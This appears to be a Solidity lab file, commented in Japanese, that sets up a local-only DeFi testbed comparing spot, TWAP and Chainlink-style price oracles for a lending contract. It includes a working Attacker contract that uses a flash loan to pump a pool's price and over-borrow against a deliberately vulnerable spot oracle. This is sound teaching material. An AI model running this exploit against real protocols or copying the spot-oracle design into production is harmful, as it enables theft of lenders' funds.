// SPDX-License-Identifier: MIT
// 実験用のコントラクト一式（ローカルの Anvil 専用。監査していないので本番に使わない）。
// Token: 発行できる最小の ERC-20。tETH と tUSD の 2 種類を作る。
// Pool: x * y = k の交換所（手数料 0.3%）。価格の累積値を記録し、時間加重平均（TWAP）を返せる。
// PushFeed: 外から書き込まれる価格。Chainlink の latestRoundData と同じ形で読める。
// SpotSource / TwapSource / FeedSource: 貸付が読む価格の取り出し口。単位は 1 tETH あたりの tUSD（18 桁）。
// Lending: tETH を担保に tUSD を貸す。担保の評価額の 80% まで借りられる。
// FlashLender: 同じ取引の中で返す約束で、担保なしに tUSD を貸す。
// Attacker: フラッシュローンで借りた tUSD で Pool の価格をつり上げ、その間に Lending から借りる。
pragma solidity 0.8.28;

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) { symbol = s; }

    function mint(address to, uint256 v) external { balanceOf[to] += v; }

    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s] = v; return true; }

    function transfer(address to, uint256 v) external returns (bool) {
        balanceOf[msg.sender] -= v; balanceOf[to] += v; return true;
    }

    function transferFrom(address f, address to, uint256 v) external returns (bool) {
        if (msg.sender != f) allowance[f][msg.sender] -= v;
        balanceOf[f] -= v; balanceOf[to] += v; return true;
    }
}

contract Pool {
    Token public immutable eth;
    Token public immutable usd;
    uint256 public rEth;
    uint256 public rUsd;

    // 価格 × 経過秒の累積。Uniswap v2 と同じく、価格が変わる前の値をブロックの時刻の差で掛けて足す。
    struct Obs { uint32 ts; uint256 cum; }
    Obs[] public obs;
    uint256 public cum;
    uint32 public lastTs;

    constructor(Token e, Token u) { eth = e; usd = u; lastTs = uint32(block.timestamp); obs.push(Obs(lastTs, 0)); }

    function spot() public view returns (uint256) { return rUsd * 1e18 / rEth; }

    function _accumulate() internal {
        uint32 t = uint32(block.timestamp);
        if (t != lastTs) {             // 同じブロックの中では何度呼んでも累積は増えない
            cum += spot() * (t - lastTs);
            lastTs = t;
            obs.push(Obs(t, cum));
        }
    }

    function addLiquidity(uint256 e, uint256 u) external {
        eth.transferFrom(msg.sender, address(this), e);
        usd.transferFrom(msg.sender, address(this), u);
        rEth += e; rUsd += u;
    }

    function sync() external { _accumulate(); }

    // tokenIn を amountIn だけ入れ、反対側を受け取る。手数料 0.3%。
    function swap(address tokenIn, uint256 amountIn) external returns (uint256 out) {
        _accumulate();
        bool ethIn = tokenIn == address(eth);
        (uint256 rin, uint256 rout) = ethIn ? (rEth, rUsd) : (rUsd, rEth);
        uint256 inFee = amountIn * 997 / 1000;
        out = rout * inFee / (rin + inFee);
        Token(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        if (ethIn) { rEth += amountIn; rUsd -= out; usd.transfer(msg.sender, out); }
        else { rUsd += amountIn; rEth -= out; eth.transfer(msg.sender, out); }
    }

    function _cumAt(uint256 t) internal view returns (uint256) {
        if (t >= lastTs) return cum + spot() * (t - lastTs);
        uint256 i = obs.length - 1;
        while (obs[i].ts > t) i--;     // t 以前で最後の記録を探す
        Obs memory a = obs[i];
        Obs memory b = obs[i + 1];
        return a.cum + (b.cum - a.cum) * (t - a.ts) / (b.ts - a.ts);
    }

    // 直近 window 秒の時間加重平均の価格
    function twap(uint256 window) external view returns (uint256) {
        uint256 nowTs = block.timestamp;
        return (_cumAt(nowTs) - _cumAt(nowTs - window)) / window;
    }
}

contract PushFeed {
    address public immutable updater;
    int256 public answer;              // 8 桁（Chainlink の USD 建てのフィードと同じ）
    uint256 public updatedAt;
    uint80 public roundId;

    constructor() { updater = msg.sender; }

    function update(int256 a) external {
        require(msg.sender == updater, "only updater");
        answer = a; updatedAt = block.timestamp; roundId++;
    }

    function decimals() external pure returns (uint8) { return 8; }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (roundId, answer, updatedAt, updatedAt, roundId);
    }
}

interface IPriceSource { function price() external view returns (uint256); }

contract SpotSource is IPriceSource {
    Pool public immutable pool;
    constructor(Pool p) { pool = p; }
    function price() external view returns (uint256) { return pool.spot(); }
}

contract TwapSource is IPriceSource {
    Pool public immutable pool;
    uint256 public immutable window;
    constructor(Pool p, uint256 w) { pool = p; window = w; }
    function price() external view returns (uint256) { return pool.twap(window); }
}

contract FeedSource is IPriceSource {
    PushFeed public immutable feed;
    uint256 public immutable maxAge;
    constructor(PushFeed f, uint256 m) { feed = f; maxAge = m; }
    function price() external view returns (uint256) {
        (, int256 a, , uint256 updatedAt, ) = feed.latestRoundData();
        require(a > 0, "bad answer");
        require(block.timestamp - updatedAt <= maxAge, "stale price");
        return uint256(a) * 10 ** (18 - feed.decimals());  // フィードの桁数を 18 桁にそろえる
    }
}

interface IFlashBorrower { function onFlashLoan(uint256 amount, uint256 fee) external; }

contract Lending {
    Token public immutable eth;
    Token public immutable usd;
    IPriceSource public immutable source;
    uint256 public constant LTV = 80;  // 担保の評価額の 80% まで借りられる
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    constructor(Token e, Token u, IPriceSource s) { eth = e; usd = u; source = s; }

    function deposit(uint256 v) external { eth.transferFrom(msg.sender, address(this), v); collateral[msg.sender] += v; }

    function maxBorrow(address a) public view returns (uint256) {
        uint256 limit = collateral[a] * source.price() / 1e18 * LTV / 100;
        return limit > debt[a] ? limit - debt[a] : 0;
    }

    function borrow(uint256 v) external {
        require(v <= maxBorrow(msg.sender), "over limit");
        debt[msg.sender] += v;
        usd.transfer(msg.sender, v);
    }

}

// フラッシュローンの貸し手（Lending とは別のプロトコルの役）。
// 同じ取引の中で返せば担保なしで借りられる。返せなければ取引ごと取り消される（revert）。
contract FlashLender {
    Token public immutable usd;
    constructor(Token u) { usd = u; }

    function flashLoan(uint256 amount) external {
        uint256 before = usd.balanceOf(address(this));
        uint256 fee = amount * 9 / 10000; // 0.09%
        usd.transfer(msg.sender, amount);
        IFlashBorrower(msg.sender).onFlashLoan(amount, fee);
        require(usd.balanceOf(address(this)) >= before + fee, "flash loan not repaid");
    }
}

contract Attacker is IFlashBorrower {
    Token immutable eth;
    Token immutable usd;
    Pool immutable pool;
    Lending immutable lending;
    FlashLender immutable flash;
    IPriceSource[3] watch;             // 手順ごとに 3 つの取り出し口の値を記録する（spot・twap・feed）
    uint256 immutable collateralEth;

    error CannotRepay(uint256 held, uint256 owed, uint256 borrowed);
    event Step(uint8 step, uint256 spot, uint256 twap, uint256 feed, uint256 usdHeld, uint256 ethHeld);

    constructor(Pool p, Lending l, FlashLender f, IPriceSource[3] memory w, uint256 c) {
        pool = p; lending = l; flash = f; eth = p.eth(); usd = p.usd(); watch = w; collateralEth = c;
        eth.approve(address(p), type(uint256).max);
        usd.approve(address(p), type(uint256).max);
        eth.approve(address(l), type(uint256).max);
    }

    function _log(uint8 s) internal {
        emit Step(s, watch[0].price(), watch[1].price(), watch[2].price(), usd.balanceOf(address(this)), eth.balanceOf(address(this)));
    }

    function attack(uint256 flashAmount) external {
        _log(0);                                         // 0. 手元は 0
        flash.flashLoan(flashAmount);
        _log(6);                                         // 6. 返済後に残った額が利益
        usd.transfer(msg.sender, usd.balanceOf(address(this)));
    }

    function onFlashLoan(uint256 amount, uint256 fee) external {
        require(msg.sender == address(flash));
        _log(1);                                         // 1. フラッシュローンで tUSD を借りた
        pool.swap(address(usd), amount);                 // 2. 全部で tETH を買い、Pool の価格をつり上げる
        _log(2);
        lending.deposit(collateralEth);                  // 3. 買った tETH の一部を担保に入れる
        _log(3);
        lending.borrow(lending.maxBorrow(address(this))); // 4. つり上がった価格で評価させて借りる
        _log(4);
        pool.swap(address(eth), eth.balanceOf(address(this))); // 5. 残りの tETH を売り戻す
        _log(5);
        uint256 held = usd.balanceOf(address(this));
        if (held < amount + fee) revert CannotRepay(held, amount + fee, lending.debt(address(this))); // 全部取り消し
        usd.transfer(address(flash), amount + fee);
    }
}
